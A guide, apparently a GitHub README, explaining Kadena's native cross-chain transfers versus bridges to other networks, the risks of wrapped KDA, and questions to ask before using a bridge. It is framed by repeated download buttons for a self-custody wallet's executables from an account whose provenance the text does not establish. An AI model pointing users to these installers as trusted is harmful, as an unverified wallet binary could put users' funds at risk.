![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Bridges to and from Kadena: What Exists and What It Costs You</h1>

<p align="center">A Kadena Wallet guide to the network and the market.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

The word "bridge" gets used for two different things in this ecosystem, and the confusion produces bad decisions. Moving value between the twenty chains of this network is a protocol operation with no bridge and no operator. Moving value between this network and another chain entirely is a bridge, and there the operator is the whole risk.

Once those are separated, the useful question stops being "which bridge is best" and becomes "do I need one at all".

## You'll see this if

- You want to move KDA to another blockchain.
- You have been told a bridge is the cheap route and want to know what it costs.
- A bridge interface showed an "in test" warning and you are deciding whether to proceed.
- You are holding a wrapped version of KDA and wondering what it actually is.

## The case that needs no bridge

Within this network, value moves between chains by a protocol operation: a transfer is recorded on the source chain, a proof is produced, and the destination chain verifies it before crediting the account. That is consensus, and there is no custodian in the middle.

If your destination is another chain of the same network, a bridge is not the tool. The native transfer is cheaper, has no counterparty, and fails in ways the network can describe.

## The case that does need one

A different blockchain is a different world. It does not read this network's consensus, so something has to hold value on one side and issue a claim on the other. That something is an operator, and the operator is now part of your position.

| | Protocol transfer | Bridge |
| --- | --- | --- |
| Scope | Between chains of one network | Between networks |
| Trust | Consensus rules | The operator and its contracts |
| Failure mode | A transaction that did not complete | An operator that stopped, or a claim nobody redeems |
| Who to call when it breaks | Nobody, and that is the point | The operator, if it still answers |

## What exists now

Two facts are verifiable today, and both point the same way.

**The community bridge interface is labelled a test.** The page the community serves announces that it is a test build and asks visitors to be careful with it. That is the people running the software telling you it is unfinished, which is a different statement from a marketing page claiming safety.

**The exchange that anchored on-chain trading is gone.** It no longer answers at either of its addresses. Whatever liquidity and tooling it once provided, including any bridging routes, is not available.

No official bridge is published alongside the desktop wallet. The release contains installers and nothing else.

That leaves a beta interface and third-party options of varying provenance, which is a thin menu for a large position.

## Wrapped assets, stated plainly

When you bridge out, you often do not receive the asset. You receive a claim: a token on the destination chain that is supposed to be redeemable for the original.

Three things follow.

**The claim is only as good as the issuer.** If the operator's reserves are real and its contracts work, the claim is worth what it says. If either fails, the claim is a token whose value depends on someone else's solvency.

**Redemption is a second transaction with the same risk.** Bridging back is not the inverse of bridging out; it is a new request to the same operator, at a later date, under whatever conditions exist then.

**A wrapped balance is not a native balance.** Gas on the destination chain is paid in that chain's asset, not in the claim, so a wrapped position can be stranded by having nothing to move it with.

## Five questions before trusting a bridge

1. **Who operates it, by name?** An entity with a registered presence and a history is different from an interface.
2. **What do the operators say about its state?** A page warning that it is in test has answered the question for you.
3. **Where does the backing live, and can you verify it?** A reserve is only reassuring if you can inspect it.
4. **What happens if the operator stops?** If the answer is "the claim becomes unredeemable", you have priced the risk correctly.
5. **Is the destination worth it?** A bridge fee plus a wrapped asset plus gas on the far side is a lot of machinery for a small move.

## When a bridged position goes wrong

This is where the two kinds of transfer diverge most sharply.

A protocol transfer that stalls leaves value the network still accounts for, and a completion exists. A bridge position that stalls leaves a claim on an operator, and if the operator is not answering, there is no protocol to appeal to. The chain has no opinion about a promise someone else made.

Practical order of operations: find the transaction on both sides, confirm whether the source leg completed, read the operator's contracts if they are readable, and keep the hashes and dates. Then decide whether the position is a technical problem with a route, or a documented loss.

## Why a bridge is the wrong answer to a delisting

When a venue stops accepting deposits, the instinct is to bridge somewhere that will. That instinct usually fails for a simpler reason: the destination venue has to support the asset, and after a delisting wave the venues that do are few.

A bridge moves value to a chain. It does not create a market on that chain, and it does not make an exchange accept a deposit. Check the destination first, then decide whether the bridge is even on the path.

## What I would actually do

- **Stay inside the network** if the goal is to reach another one of its chains. Use the protocol transfer.
- **Treat the community bridge as beta**, exactly as its own banner says, and only with an amount you could lose without changing your plans.
- **Verify the destination venue before bridging.** A successful bridge to a chain with no exit is a longer route to the same problem.
- **Keep the evidence** for any bridge transaction, on both sides, with dates.

## FAQ

**Do I need a bridge to move KDA between chains?**
No. Transfers between chains of this network are protocol operations verified by consensus.

**Is there an official bridge?**
None is published with the desktop wallet. What exists is a community interface that describes itself as in test.

**What is wrapped KDA?**
A claim on another chain, issued by whoever operates the bridge, redeemable only if that operator honours it.

**Can a bridge transaction be reversed?**
Not by you. A bridge is a promise, and promises are enforced by the operator's contracts rather than by consensus.

**Is bridging cheaper than an exchange withdrawal?**
Sometimes, and the comparison is misleading: a withdrawal fee buys a service with support, while a bridge fee buys a claim with an operator.

## Related reading

- Cross-chain transfers in Kadena Wallet: how the twenty chains connect
- Stuck cross-chain transfer: what the network can and cannot fix
- How to cash out KDA from Kadena Wallet
- Why KDA was delisted: the exchange decisions, in order

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Best Kadena Wallet in 2026: Every Option That Still Works](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/best-kadena-wallet-in-2026.md)
- [Zelcore vs Kadena Wallet: Multi-Asset Against Kadena-First](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/zelcore-vs-kadena-wallet.md)
- [Kadena Wallet vs eckoWALLET: Desktop and Extension Compared](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/kadena-wallet-vs-eckowallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
